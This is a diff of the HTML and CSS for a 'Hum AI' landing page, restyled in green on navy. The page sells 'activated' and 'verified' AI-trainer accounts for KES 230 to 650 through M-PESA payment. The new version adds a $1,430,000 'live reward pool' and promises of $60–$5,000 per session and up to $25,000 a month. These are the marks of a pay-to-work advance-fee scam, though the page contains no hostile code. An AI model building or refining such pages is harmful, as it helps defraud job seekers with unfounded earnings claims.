@@ -2,616 +2,351 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Hum AI · trainer access</title>
-  <!-- Google Fonts: Inter + Space Grotesk -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <!-- Font Awesome -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hum AI · unified trainer access</title>
+  <!-- font & icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <!-- SweetAlert2 -->
   <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    /* ------------------ RESET + GLOBAL (dark bg #0B1623, bright green #1FE08B) ------------------ */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      background: #0f1217;
       font-family: 'Inter', sans-serif;
-      color: #eef2f5;
-      line-height: 1.4;
+      background: #0B1623;   /* dark navy background stays */
+      color: #ecf3f8;         /* soft white */
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      position: relative;
+      overflow-x: hidden;
     }
 
-    /* subtle grain */
-    .grain {
+    /* bright green glow using #1FE08B */
+    body::before {
+      content: '';
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjc0IiBudW1PY3RhdmVzPSIzIiAvPjwvZmlsdGVyPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbHRlcj0idXJsKCNmKSIgb3BhY2l0eT0iMC4wMjUiIC8+PC9zdmc+');
-      opacity: 0.18;
-      pointer-events: none;
-      z-index: 0;
+      inset: 0;
+      background:
+        radial-gradient(circle at 20% 30%, rgba(31, 224, 139, 0.18), transparent 60%),
+        radial-gradient(circle at 80% 70%, rgba(31, 224, 139, 0.12), transparent 60%);
+      z-index: -2;
     }
 
-    /* floating orbs */
-    .data-orb {
+    /* faint grid with the bright green */
+    body::after {
+      content: '';
       position: fixed;
-      bottom: 10%;
-      right: 5%;
-      width: 180px;
-      height: 180px;
-      background: radial-gradient(circle at 30% 30%, rgba(152, 255, 176, 0.15), transparent 70%);
-      border-radius: 50%;
-      filter: blur(35px);
-      z-index: 1;
-      pointer-events: none;
-      animation: orbFloat 16s infinite alternate ease-in-out;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(31, 224, 139, 0.1) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(31, 224, 139, 0.1) 1px, transparent 1px);
+      background-size: 40px 40px;
+      z-index: -1;
     }
 
-    .data-orb2 {
-      position: fixed;
-      top: 15%;
-      left: 0%;
-      width: 250px;
-      height: 250px;
-      background: radial-gradient(circle at 70% 20%, rgba(100, 180, 255, 0.1), transparent 80%);
-      border-radius: 50%;
-      filter: blur(45px);
-      z-index: 1;
-      pointer-events: none;
-      animation: orbFloat2 20s infinite alternate;
-    }
-
-    @keyframes orbFloat {
-      0% { transform: translate(0, 0) scale(1); opacity: 0.4; }
-      100% { transform: translate(-20px, -20px) scale(1.2); opacity: 0.7; }
-    }
-    @keyframes orbFloat2 {
-      0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
-      100% { transform: translate(20px, 30px) scale(1.3); opacity: 0.6; }
-    }
-
-    /* main container */
+    /* main container — consistent width 480px */
     .app {
       max-width: 480px;
-      width: 100%;
       margin: 0 auto;
-      padding: 24px 20px 32px;
+      padding: 22px 18px 40px;
       display: flex;
       flex-direction: column;
       gap: 28px;
       position: relative;
-      z-index: 20;
+      z-index: 10;
     }
 
-    /* top row */
-    .top-row {
+    /* ------------------ HEADER ------------------ */
+    .header {
       display: flex;
-      align-items: center;
       justify-content: space-between;
-      background: rgba(22, 28, 36, 0.75);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(152, 255, 176, 0.15);
-      border-radius: 20px;
-      padding: 12px 18px;
-      box-shadow: 0 10px 30px -20px #00000080;
-    }
-
-    .hum-logo {
-      display: flex;
       align-items: center;
-      gap: 4px;
     }
 
-    .slant-h {
-      font-size: 2.6rem;
-      font-weight: 600;
+    .logo {
       font-family: 'Space Grotesk', sans-serif;
-      transform: skewX(-8deg) scale(1.05);
-      color: #98ffb0;
-      letter-spacing: -4px;
-      margin-right: -6px;
-      line-height: 1;
-    }
-
-    .hum-text {
       font-size: 1.8rem;
-      font-weight: 500;
-      letter-spacing: -0.5px;
-      color: #eef5f0;
-      font-family: 'Space Grotesk', sans-serif;
-    }
-
-    .trainer-pulse {
-      background: rgba(152, 255, 176, 0.08);
-      border: 1px solid rgba(152, 255, 176, 0.3);
-      border-radius: 40px;
-      padding: 6px 16px;
-      font-size: 0.85rem;
-      font-weight: 500;
-      color: #d0f0da;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .dot {
-      width: 8px;
-      height: 8px;
-      background: #98ffb0;
-      border-radius: 10px;
-      opacity: 0.9;
-      animation: subtlePulse 2s infinite;
-    }
-    @keyframes subtlePulse {
-      0% { opacity: 0.6; transform: scale(1); }
-      50% { opacity: 1; transform: scale(1.2); }
-    }
-
-    /* headline */
-    .headline {
-      margin: 8px 0 0;
-    }
-    .headline h1 {
-      font-size: 3rem;
       font-weight: 600;
-      font-family: 'Space Grotesk', sans-serif;
-      line-height: 1.1;
-      letter-spacing: -1.5px;
+      letter-spacing: -1px;
       color: #ffffff;
+    }
+
+    .logo span { color: #1FE08B; } /* bright green */
+
+    .status {
+      font-size: 0.8rem;
+      padding: 6px 14px;
+      border-radius: 30px;
+      border: 1px solid #2a4055;
+      background: #142a3c;
+      color: #d4e9ff;
       display: flex;
       align-items: center;
-      gap: 4px;
-      flex-wrap: wrap;
+      gap: 6px;
     }
-    .headline h1 .big-h {
-      font-size: 3.6rem;
-      transform: skewX(-8deg);
-      color: #98ffb0;
-      font-weight: 600;
-      display: inline-block;
+
+    .status-dot {
+      width: 8px; height: 8px;
+      background: #1FE08B;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
     }
-    .headline h1 .trainer-tag {
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(152, 255, 176, 0.25);
-      border-radius: 60px;
-      padding: 0px 16px;
-      font-size: 1.4rem;
-      font-weight: 400;
-      margin-left: 8px;
-      color: #d0f0da;
+
+    @keyframes pulse { 0%{opacity:0.5} 50%{opacity:1} 100%{opacity:0.5} }
+
+    /* ------------------ HERO ------------------ */
+    .hero h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 2.4rem;
+      line-height: 1.1;
+      letter-spacing: -1px;
+      color: #ffffff;
     }
-    .sub {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      font-size: 1rem;
-      font-weight: 400;
-      color: #9aaeb9;
+
+    .hero .glow { color: #1FE08B; }
+
+    .hero p {
       margin-top: 12px;
-      letter-spacing: -0.2px;
-    }
-    .sub i {
-      color: #98ffb0;
-      font-size: 1.2rem;
-      opacity: 0.8;
-    }
-    .chip {
-      background: rgba(255,255,255,0.02);
-      border: 1px solid rgba(152, 255, 176, 0.2);
-      border-radius: 40px;
-      padding: 4px 16px;
-      font-size: 0.9rem;
+      color: #b6d5f0;
+      font-size: 0.95rem;
     }
 
-    /* AI activity bar */
-    .live-bar {
-      background: rgba(18, 24, 30, 0.7);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(152, 255, 176, 0.15);
-      border-radius: 28px;
-      padding: 14px 22px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      transition: border-color 0.2s;
-    }
-    .live-bar:hover {
-      border-color: rgba(152, 255, 176, 0.4);
-    }
-    .live-left {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-    .live-left i {
-      font-size: 1.5rem;
-      color: #98ffb0;
-      opacity: 0.8;
-    }
-    .bars {
-      display: flex;
-      gap: 5px;
-    }
-    .bars span {
-      width: 4px;
-      height: 18px;
-      background: #98ffb0;
-      border-radius: 10px;
-      opacity: 0.6;
-      animation: modernBounce 1.8s infinite;
-    }
-    .bars span:nth-child(2) { height: 24px; opacity: 0.8; animation-delay: 0.2s; }
-    .bars span:nth-child(3) { height: 14px; animation-delay: 0.4s; }
-    .bars span:nth-child(4) { height: 22px; opacity: 0.7; animation-delay: 0.6s; }
-    .bars span:nth-child(5) { height: 16px; animation-delay: 0.8s; }
-    @keyframes modernBounce {
-      0% { transform: scaleY(0.9); opacity: 0.5; }
-      50% { transform: scaleY(1.3); opacity: 0.9; }
-    }
-    .live-right {
-      background: rgba(152, 255, 176, 0.05);
-      border: 1px solid rgba(152, 255, 176, 0.2);
-      border-radius: 40px;
-      padding: 6px 18px;
-      font-size: 0.9rem;
-      color: #cce6d4;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    /* depth graph */
-    .depth-graph {
-      background: rgba(18, 24, 30, 0.5);
-      backdrop-filter: blur(8px);
-      border: 1px solid rgba(152, 255, 176, 0.12);
-      border-radius: 24px;
-      padding: 16px 20px;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      margin: -8px 0 0;
-    }
-    .graph-lines {
-      display: flex;
-      align-items: flex-end;
-      gap: 6px;
-      height: 40px;
-      flex: 1;
-    }
-    .graph-lines .line {
-      width: 8px;
-      background: #98ffb0;
-      opacity: 0.3;
-      border-radius: 10px;
-      height: calc(100% * var(--h));
-      transition: opacity 0.2s;
-    }
-    .graph-lines .line:nth-child(1) { --h: 0.6; height: 24px; }
-    .graph-lines .line:nth-child(2) { --h: 0.9; height: 36px; opacity: 0.6; }
-    .graph-lines .line:nth-child(3) { --h: 0.7; height: 28px; }
-    .graph-lines .line:nth-child(4) { --h: 1; height: 40px; opacity: 0.8; }
-    .graph-lines .line:nth-child(5) { --h: 0.5; height: 20px; }
-    .graph-lines .line:nth-child(6) { --h: 0.8; height: 32px; opacity: 0.5; }
-    .graph-lines .line:nth-child(7) { --h: 0.4; height: 16px; }
-    .graph-lines:hover .line {
-      opacity: 0.8;
-    }
-    .depth-label {
-      font-size: 0.85rem;
-      color: #9fc5b5;
-      letter-spacing: 0.2px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .depth-label i {
-      color: #98ffb0;
-      font-size: 1rem;
-    }
-
-    /* cards */
-    .cards-grid {
+    /* ------------------ INSIGHT CARDS (dark, bright green accents) ------------------ */
+    .insight-grid {
       display: flex;
       flex-direction: column;
       gap: 20px;
-      margin: 8px 0;
+    }
+
+    .insight-card {
+      background: #102433;
+      padding: 20px;
+      border-radius: 20px;
+      border: 1px solid #2a4055;
+    }
+
+    .insight-card h2 {
+      font-size: 1.3rem;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
+
+    .insight-card .earn-big {
+      font-size: 1.6rem;
+      color: #1FE08B;
+      font-weight: 600;
+    }
+
+    .small-meta {
+      font-size: 0.8rem;
+      color: #aac9e5;
+    }
+
+    /* ------------------ PRICING CARDS (dark, with vibrant green) ------------------ */
+    .cards {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
     }
 
     .card {
-      background: rgba(20, 26, 32, 0.65);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(152, 255, 176, 0.15);
-      border-radius: 28px;
-      padding: 22px 20px 20px;
-      box-shadow: 0 20px 35px -25px #000000, 0 0 0 1px rgba(255,255,255,0.02) inset;
+      padding: 22px;
+      border-radius: 24px;
+      border: 1px solid #2a4055;
+      background: #102433;
       transition: 0.2s ease;
-      position: relative;
-      overflow: hidden;
     }
+
     .card:hover {
-      border-color: rgba(152, 255, 176, 0.4);
-      background: rgba(24, 32, 40, 0.7);
-    }
-    .card::after {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #98ffb0, transparent);
-      opacity: 0.2;
+      border-color: #1FE08B;
+      box-shadow: 0 0 28px rgba(31, 224, 139, 0.4);
     }
 
-    .card-top {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 16px;
-    }
-    .card-top h2 {
-      font-size: 2rem;
-      font-weight: 500;
+    .card h2 {
       font-family: 'Space Grotesk', sans-serif;
-      letter-spacing: -0.5px;
-      color: #f0f8f2;
+      font-size: 1.4rem;
+      color: #ffffff;
     }
-    .card-top h2 span {
-      font-size: 1rem;
-      font-weight: 400;
-      color: #98ffb0;
-      margin-left: 4px;
-      opacity: 0.9;
-    }
+
     .price {
-      background: transparent;
-      border: 1px solid rgba(152, 255, 176, 0.5);
-      border-radius: 40px;
-      padding: 6px 18px;
-      font-size: 1.9rem;
-      font-weight: 500;
-      font-family: 'Space Grotesk', sans-serif;
-      color: #98ffb0;
-      line-height: 1;
-    }
-    .price small {
-      font-size: 0.9rem;
-      font-weight: 400;
-      color: #9fc5b5;
-      margin-right: 4px;
+      margin-top: 8px;
+      font-size: 1.8rem;
+      font-weight: 600;
+      color: #1FE08B;
     }
 
-    .feature-list {
+    .features {
+      margin-top: 14px;
       display: flex;
-      flex-wrap: wrap;
-      gap: 8px 14px;
-      margin: 20px 0 22px;
-    }
-    .feature-list .feat {
-      background: rgba(255,255,255,0.02);
-      border: 1px solid rgba(152, 255, 176, 0.2);
-      border-radius: 40px;
-      padding: 5px 18px;
-      font-size: 0.9rem;
-      font-weight: 400;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: #d0e6da;
-      transition: border-color 0.2s;
-    }
-    .feature-list .feat:hover {
-      border-color: rgba(152, 255, 176, 0.5);
-    }
-    .feat i {
-      color: #98ffb0;
-      font-size: 0.9rem;
-      opacity: 0.8;
+      flex-direction: column;
+      gap: 6px;
+      font-size: 0.85rem;
+      color: #d2e6ff;
     }
 
-    .card-footer {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .stock-badge {
-      background: rgba(0,0,0,0.2);
-      border: 1px solid rgba(152, 255, 176, 0.2);
-      border-radius: 40px;
-      padding: 6px 18px;
-      font-size: 0.9rem;
-      font-weight: 400;
-      color: #bcd9cc;
-    }
-    .buy-btn {
-      background: rgba(152, 255, 176, 0.1);
-      border: 1px solid #98ffb0;
-      border-radius: 40px;
-      padding: 10px 28px;
-      font-weight: 500;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: #e6ffee;
-      backdrop-filter: blur(8px);
-      transition: 0.15s;
-      cursor: pointer;
-    }
-    .buy-btn i {
-      color: #98ffb0;
-      font-size: 1.1rem;
-      transition: transform 0.2s;
-    }
-    .buy-btn:active {
-      background: rgba(152, 255, 176, 0.2);
-      transform: scale(0.98);
-    }
-    .buy-btn:hover i {
-      transform: translateX(4px);
+    .features i {
+      margin-right: 6px;
+      color: #1FE08B;
     }
 
-    /* payment row */
-    .payment-row {
-      background: rgba(18, 24, 30, 0.6);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(152, 255, 176, 0.2);
-      border-radius: 60px;
-      padding: 14px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
+    .buy {
+      margin-top: 18px;
+      padding: 12px;
+      border-radius: 30px;
+      border: none;
+      width: 100%;
       font-size: 1rem;
-      font-weight: 400;
-      color: #d2f0e0;
-      margin: 12px 0 8px;
+      font-weight: 600;
+      cursor: pointer;
+      background: #1FE08B;
+      color: #0B1623;
+      transition: 0.2s;
     }
-    .payment-row i {
-      color: #98ffb0;
-      font-size: 1.3rem;
-      opacity: 0.8;
+
+    .buy:hover {
+      background: #4af0a8;
+      box-shadow: 0 0 12px #1FE08B;
     }
+
+    .buy:active { transform: scale(0.98); }
 
     /* footer */
     .footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.85rem;
-      font-weight: 400;
-      margin-top: 28px;
-      padding-top: 20px;
-      border-top: 1px solid rgba(152, 255, 176, 0.2);
-      color: #8fa8b0;
-    }
-    .footer a {
-      color: #c0e6d0;
-      text-decoration: none;
-      border-bottom: 1px dotted rgba(152, 255, 176, 0.5);
+      text-align: center;
+      font-size: 0.75rem;
+      color: #8fb4d4;
+      margin-top: 30px;
     }
 
-    /* SweetAlert2 custom styles */
+    /* SweetAlert2 custom styles - matching theme */
     .swal2-popup {
+      background: #102433 !important;
+      color: #ecf3f8 !important;
+      border: 1px solid #2a4055 !important;
       border-radius: 24px !important;
-      padding: 24px 20px !important;
-      background: rgba(22, 28, 36, 0.98) !important;
-      backdrop-filter: blur(20px) !important;
-      color: #eef2f5 !important;
-      border: 1px solid rgba(152, 255, 176, 0.3) !important;
+      font-family: 'Inter', sans-serif !important;
     }
 
     .swal2-title {
-      color: #98ffb0 !important;
-      font-weight: 600 !important;
+      color: #ffffff !important;
       font-family: 'Space Grotesk', sans-serif !important;
     }
 
     .swal2-html-container {
-      color: #d0e6da !important;
-    }
-
-    .swal2-confirm {
-      background: rgba(152, 255, 176, 0.2) !important;
-      border: 1px solid #98ffb0 !important;
-      border-radius: 40px !important;
-      color: #e6ffee !important;
-      font-weight: 500 !important;
-      padding: 12px 28px !important;
-    }
-
-    .swal2-cancel {
-      background: rgba(255,255,255,0.05) !important;
-      border: 1px solid rgba(152, 255, 176, 0.2) !important;
-      border-radius: 40px !important;
-      color: #9aaeb9 !important;
-      font-weight: 500 !important;
-      padding: 12px 28px !important;
+      color: #d2e6ff !important;
     }
 
     .swal2-input, .swal2-textarea {
-      background: rgba(18, 24, 30, 0.9) !important;
-      border: 1px solid rgba(152, 255, 176, 0.3) !important;
-      border-radius: 16px !important;
-      color: #eef2f5 !important;
+      background: #0B1623 !important;
+      border: 1px solid #2a4055 !important;
+      border-radius: 12px !important;
+      color: #ffffff !important;
       font-family: 'Inter', sans-serif !important;
+      font-size: 16px !important;
       padding: 12px 16px !important;
+      width: 100% !important;
       margin: 8px 0 !important;
     }
 
     .swal2-input:focus, .swal2-textarea:focus {
-      border-color: #98ffb0 !important;
-      box-shadow: 0 0 0 2px rgba(152, 255, 176, 0.2) !important;
+      border-color: #1FE08B !important;
+      box-shadow: 0 0 0 2px rgba(31, 224, 139, 0.2) !important;
+      outline: none !important;
     }
 
-    .swal2-loader {
-      border-color: #98ffb0 transparent #98ffb0 transparent !important;
+    .swal2-confirm {
+      background: #1FE08B !important;
+      color: #0B1623 !important;
+      border: none !important;
+      border-radius: 30px !important;
+      font-weight: 600 !important;
+      padding: 12px 24px !important;
+      font-size: 1rem !important;
     }
 
-    .swal2-timer-progress-bar {
-      background: #98ffb0 !important;
+    .swal2-cancel {
+      background: transparent !important;
+      color: #8fb4d4 !important;
+      border: 1px solid #2a4055 !important;
+      border-radius: 30px !important;
+      font-weight: 500 !important;
+      padding: 12px 24px !important;
+      font-size: 1rem !important;
     }
 
-    /* phone input group */
+    .swal2-confirm:hover {
+      background: #4af0a8 !important;
+    }
+
+    .swal2-cancel:hover {
+      border-color: #1FE08B !important;
+      color: #ffffff !important;
+    }
+
+    /* Phone input group - matching theme */
     .phone-input-group {
       display: flex;
       align-items: center;
-      gap: 8px;
-      background: rgba(18, 24, 30, 0.9);
-      border: 1px solid rgba(152, 255, 176, 0.3);
-      border-radius: 16px;
-      padding: 0 0 0 16px;
+      background: #0B1623;
+      border: 1px solid #2a4055;
+      border-radius: 12px;
       margin: 8px 0;
+      overflow: hidden;
     }
+
     .phone-prefix {
-      color: #98ffb0;
-      font-size: 0.9rem;
-      white-space: nowrap;
+      padding: 0 12px;
+      color: #1FE08B;
+      font-size: 1rem;
+      background: #142a3c;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      border-right: 1px solid #2a4055;
+      font-weight: 500;
     }
+
     .phone-input-group input {
       flex: 1;
       background: transparent !important;
       border: none !important;
-      padding: 12px 16px 12px 0 !important;
+      padding: 12px 16px !important;
       margin: 0 !important;
-      color: #eef2f5;
-      font-size: 0.9rem;
+      color: #ffffff !important;
+      font-size: 16px !important;
+      height: 48px;
     }
-    .phone-input-group input:focus { outline: none; }
 
-    /* summary box */
+    .phone-input-group input:focus {
+      outline: none !important;
+      box-shadow: none !important;
+    }
+
+    /* Summary box */
     .summary-box {
-      background: rgba(18, 24, 30, 0.8);
+      background: #0B1623;
       border-radius: 16px;
       padding: 16px;
-      margin: 8px 0;
+      margin: 12px 0;
+      border: 1px solid #2a4055;
     }
+
     .summary-row {
       display: flex;
       justify-content: space-between;
       margin-bottom: 8px;
       font-size: 0.95rem;
     }
-    .summary-row:last-child { margin-bottom: 0; }
-    .summary-label { color: #9aaeb9; }
-    .summary-value { color: #98ffb0; font-weight: 500; }
 
-    /* info note */
+    .summary-row:last-child { margin-bottom: 0; }
+    .summary-label { color: #aac9e5; }
+    .summary-value { color: #1FE08B; font-weight: 600; }
+
+    /* Info note */
     .info-note {
-      background: rgba(152, 255, 176, 0.1);
-      border-left: 3px solid #98ffb0;
+      background: rgba(31, 224, 139, 0.1);
+      border-left: 3px solid #1FE08B;
       padding: 12px;
       border-radius: 10px;
       margin: 12px 0;
@@ -619,664 +354,509 @@
       font-size: 0.85rem;
     }
 
-    /* STK push modal styles */
-    .stk-push-content {
-      text-align: center;
-      padding: 0 5px;
-    }
-    .stk-push-icon {
-      font-size: 2.5rem !important;
-      color: #98ffb0;
+    /* Payment status icons */
+    .stk-push-icon, .success-icon, .error-icon {
+      font-size: 2.5rem;
+      color: #1FE08B;
       margin-bottom: 12px;
     }
+
     .stk-phone-display {
-      background: rgba(18, 24, 30, 0.8);
-      padding: 10px;
+      background: #0B1623;
+      padding: 12px;
       border-radius: 12px;
       margin: 12px 0;
       font-weight: 600;
-      font-size: 0.95rem;
-      color: #98ffb0;
+      color: #1FE08B;
+      border: 1px solid #2a4055;
     }
-    .success-icon {
-      font-size: 3rem !important;
-      color: #98ffb0;
-      margin-bottom: 12px;
+
+    .swal2-loader {
+      border-color: #1FE08B transparent #1FE08B transparent !important;
     }
-    .error-icon {
-      font-size: 2.5rem !important;
-      color: #f59e0b;
-      margin-bottom: 12px;
+
+    .swal2-timer-progress-bar {
+      background: #1FE08B !important;
     }
   </style>
 </head>
 <body>
-  <!-- grain texture -->
-  <div class="grain"></div>
-  <!-- floating orbs -->
-  <div class="data-orb"></div>
-  <div class="data-orb2"></div>
+<div class="app">
 
-  <div class="app">
-    <!-- header -->
-    <div class="top-row">
-      <div class="hum-logo">
-        <span class="slant-h">H</span>
-        <span class="hum-text">um AI</span>
-      </div>
-      <div class="trainer-pulse">
-        <span class="dot"></span> trainer live
-      </div>
-    </div>
-
-    <!-- headline -->
-    <div class="headline">
-      <h1>
-        <span class="big-h">H</span>um AI
-        <span class="trainer-tag">trainer</span>
-      </h1>
-      <div class="sub">
-        <i class="fas fa-asterisk"></i> help shape the model
-        <span class="chip">2.4k+ trainers</span>
-      </div>
-    </div>
-
-    <!-- AI activity bar -->
-    <div class="live-bar">
-      <div class="live-left">
-        <i class="fas fa-pulse"></i>
-        <div class="bars">
-          <span></span><span></span><span></span><span></span><span></span>
-        </div>
-      </div>
-      <div class="live-right">
-        <i class="fas fa-circle" style="font-size: 0.5rem; color: #98ffb0;"></i> 439 active
-      </div>
-    </div>
-
-    <!-- depth graph -->
-    <div class="depth-graph">
-      <div class="graph-lines">
-        <div class="line"></div>
-        <div class="line"></div>
-        <div class="line"></div>
-        <div class="line"></div>
-        <div class="line"></div>
-        <div class="line"></div>
-        <div class="line"></div>
-      </div>
-      <div class="depth-label">
-        <i class="fas fa-chart-line"></i>
-        <span>training depth</span>
-      </div>
-    </div>
-
-    <!-- three cards -->
-    <div class="cards-grid">
-      <!-- activated only (KES 230) -->
-      <div class="card">
-        <div class="card-top">
-          <h2>activated <span>only</span></h2>
-          <div class="price"><small>KES</small>230</div>
-        </div>
-        <div class="feature-list">
-          <span class="feat"><i class="fas fa-check"></i> account activated</span>
-          <span class="feat"><i class="fas fa-check"></i> basic training slot</span>
-          <span class="feat"><i class="fas fa-check"></i> email support</span>
-        </div>
-        <div class="card-footer">
-          <span class="stock-badge"><i class="fas fa-box"></i> 214 left</span>
-          <button class="buy-btn" data-tier="activated" data-amount="230" data-fee="49"><i class="fas fa-arrow-right"></i> buy</button>
-        </div>
-      </div>
-
-      <!-- verified only (KES 470) -->
-      <div class="card">
-        <div class="card-top">
-          <h2>verified <span>only</span></h2>
-          <div class="price"><small>KES</small>470</div>
-        </div>
-        <div class="feature-list">
-          <span class="feat"><i class="fas fa-check"></i> ID pre‑verified</span>
-          <span class="feat"><i class="fas fa-check"></i> priority queue</span>
-          <span class="feat"><i class="fas fa-check"></i> early model access</span>
-        </div>
-        <div class="card-footer">
-          <span class="stock-badge"><i class="fas fa-box"></i> 97 left</span>
-          <button class="buy-btn" data-tier="verified" data-amount="470" data-fee="80"><i class="fas fa-arrow-right"></i> buy</button>
-        </div>
-      </div>
-
-      <!-- activated & verified (KES 650) -->
-      <div class="card">
-        <div class="card-top">
-          <h2>activated & verified</h2>
-          <div class="price"><small>KES</small>650</div>
-        </div>
-        <div class="feature-list">
-          <span class="feat"><i class="fas fa-check"></i> full activation+verify</span>
-          <span class="feat"><i class="fas fa-check"></i> unlimited sessions</span>
-          <span class="feat"><i class="fas fa-check"></i> 24/7 chat + influence</span>
-        </div>
-        <div class="card-footer">
-          <span class="stock-badge"><i class="fas fa-box"></i> 42 left</span>
-          <button class="buy-btn" data-tier="activated-verified" data-amount="650" data-fee="120"><i class="fas fa-arrow-right"></i> buy</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- payment row -->
-    <div class="payment-row">
-      <i class="fas fa-mobile-alt"></i>
-      <span>M-PESA · card · instant</span>
-      <i class="fas fa-arrow-right"></i>
-    </div>
-
-    <!-- footer -->
-    <div class="footer">
-      <span>© 2025 Hum AI</span>
-      <span><a href="#">terms</a> · <a href="#">help</a></span>
-      <span><i class="fas fa-dot-circle" style="color: #98ffb0;"></i> v3.2</span>
+  <!-- header -->
+  <div class="header">
+    <div class="logo">H<span>um</span> AI</div>
+    <div class="status">
+      <div class="status-dot"></div> trainer live
     </div>
   </div>
 
-  <!-- SweetAlert2 -->
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+  <!-- hero block -->
+  <div class="hero">
+    <h1>Buy <span class="glow">Hum Ai Accounts</span></h1>
+    <p>Join our AI infrastructure layer — get paid to train AI models today.</p>
+  </div>
 
-  <script>
-    // Configuration - Update with your actual API endpoints
-    const API_ENDPOINTS = {
-      initiatePayment: '/api/initiate-payment', // Your STK push endpoint
-      verifyPayment: '/api/verify-payment',
-      normalizePhone: '/api/normalize-phone'
-    };
+  <!-- INSIGHTS section — dark cards, bright green numbers -->
+  <div class="insight-grid">
+    <!-- live reward pool -->
+    <div class="insight-card">
+      <h2>🏦 Live Reward Pool</h2>
+      <div class="earn-big" id="poolDisplay">$1,430,000</div>
+      <p class="small-meta">Distributed across verified training sessions today.</p>
+    </div>
+    <!-- estimated earnings -->
+    <div class="insight-card">
+      <h2>💰 Estimated Earnings</h2>
+      <div class="earn-big">$60 – $5,000 / session</div>
+      <p class="small-meta">Weekly avg: $1,000 – $8,400 · Monthly: $3,500 – $25,000</p>
+    </div>    
+  </div>
 
-    // Loan options (tiers with fees)
-    const tierOptions = [
-      { tier: 'activated', amount: 230, fee: 49 },
-      { tier: 'verified', amount: 470, fee: 80 },
-      { tier: 'activated-verified', amount: 650, fee: 120 }
-    ];
+  <!-- PRICING CARDS -->
+  <div class="cards">
+    <div class="card" data-tier="activated" data-amount="230" data-fee="49">
+      <h2>Activated</h2>
+      <div class="price">KES 230</div>
+      <div class="features">
+        <div><i class="fas fa-check"></i> Account activated</div>
+        <div><i class="fas fa-check"></i> Basic training slot</div>
+        <div><i class="fas fa-check"></i> Email support</div>
+      </div>
+      <button class="buy">Buy Activated Account</button>
+    </div>
 
-    // State management
-    let selectedTier = null;
-    let selectedAmount = null;
-    let selectedFee = null;
-    let userEmail = '';
-    let userPhone = '';
-    let paymentReference = null;
-    let isProcessing = false;
+    <div class="card" data-tier="verified" data-amount="470" data-fee="80">
+      <h2>Verified</h2>
+      <div class="price">KES 470</div>
+      <div class="features">
+        <div><i class="fas fa-check"></i> ID pre-verified</div>
+        <div><i class="fas fa-check"></i> Priority queue</div>
+        <div><i class="fas fa-check"></i> Early model access</div>
+      </div>
+      <button class="buy">Buy Verified Account</button>
+    </div>
 
-    // DOM Elements
-    const buyButtons = document.querySelectorAll('.buy-btn');
+    <div class="card" data-tier="activated-verified" data-amount="650" data-fee="120">
+      <h2>Activated + Verified</h2>
+      <div class="price">KES 650</div>
+      <div class="features">
+        <div><i class="fas fa-check"></i> Full activation + verify</div>
+        <div><i class="fas fa-check"></i> Unlimited sessions</div>
+        <div><i class="fas fa-check"></i> 24/7 influence channel</div>
+      </div>
+      <button class="buy">Buy Activated + Verified Account</button>
+    </div>
+  </div>
 
